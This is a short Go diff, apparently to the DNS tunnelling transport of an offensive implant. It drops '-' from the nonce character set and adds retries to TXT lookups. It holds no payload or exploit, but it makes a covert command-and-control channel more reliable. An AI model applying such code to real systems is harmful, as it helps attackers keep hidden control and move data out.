@@ -71,7 +71,8 @@ const (
 )
 
 var (
-	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")
+	//Removed "-" because it appears a nonce that ends in "-" is invalid and thus breaks comms
+	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789_")
 
 	replayMutex = &sync.RWMutex{}
 	replay      = &map[string]bool{}
@@ -117,17 +118,27 @@ func isReplayAttack(ciphertext []byte) bool {
 // --------------------------- DNS SESSION SEND ---------------------------
 
 func dnsLookup(domain string) (string, error) {
+	var err error
+	var txts []string
+
 	// {{if .Config.Debug}}
 	log.Printf("[dns] lookup -> %s", domain)
 	// {{end}}
-	txts, err := net.LookupTXT(domain)
-	if err != nil || len(txts) == 0 {
-		// {{if .Config.Debug}}
-		log.Printf("[!] failure -> %s", domain)
-		// {{end}}
-		return "", err
+	for retry_count := 0; retry_count < 3; retry_count++ {
+		txts, err = net.LookupTXT(domain)
+		if err != nil || len(txts) == 0 {
+			// {{if .Config.Debug}}
+			log.Printf("[!] failure -> %s", domain)
+			// {{end}}
+		} else {
+			break
+		}
 	}
-	return strings.Join(txts, ""), nil
+	if err != nil || len(txts) == 0 {
+		return "", err
+	} else {
+		return strings.Join(txts, ""), nil
+	}
 }
 
 // Send raw bytes of an arbitrary length to the server
